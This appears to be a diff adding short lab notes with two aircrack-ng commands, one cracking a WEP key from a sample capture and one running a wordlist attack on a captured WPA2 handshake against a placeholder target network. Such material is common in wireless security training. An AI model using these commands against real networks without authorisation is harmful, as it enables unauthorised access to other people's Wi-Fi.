@@ -1,0 +1,7 @@
+WEP
+---
+aircrack-ng /home/attacker/Desktop/Sample Captures/WEPcrack-01.cap
+
+WPA
+---
+aircrack-ng -a2 -b [Target BSSID] -w /home/attacker/Desktop/Wordlist/password.txt /home/attacker/Desktop/Sample Captures/WPA2crack-01.cap
